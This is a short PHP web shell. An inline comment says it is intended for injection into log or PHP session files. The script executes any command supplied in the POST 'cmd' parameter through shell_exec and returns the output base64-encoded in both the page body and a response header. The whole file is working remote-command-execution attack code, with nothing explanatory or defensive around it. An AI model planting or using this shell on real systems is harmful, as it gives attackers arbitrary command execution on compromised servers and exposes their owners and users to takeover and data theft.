<?php /* this shell will be used for injection in logs/ php session */

if (isset($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
    $cmd = base64_encode($cmd);
    $res = 'result: ' . $cmd;
    echo '<result>'. $cmd . '</result>';
    header($res);
} else {
    echo 'Param missing.';
}
?>
